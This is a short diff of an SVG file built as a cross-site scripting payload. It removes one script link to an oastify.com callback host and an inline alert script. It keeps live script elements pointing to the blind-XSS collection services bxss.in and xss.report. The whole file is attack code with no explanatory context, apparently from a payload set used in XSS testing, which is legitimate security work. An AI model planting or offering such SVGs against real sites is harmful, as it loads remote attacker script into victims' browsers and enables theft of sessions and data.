@@ -9,12 +9,6 @@
        xmlns:xlink="http://www.w3.org/1999/xlink"
        xml:space="preserve">
     <!-- Script linked from the outside-->
-    <script xlink:href="https://3eiryir6b6r8d4am5u2lu56t7kdb13ps.oastify.com" />
     <script xlink:href="https://ab.bxss.in" />
     <script xlink:href="https://xss.report/c/ab1" />
-    <script>
-      //<![CDATA[
-        alert("ble");
-      ]]>
-    </script>
   </svg>
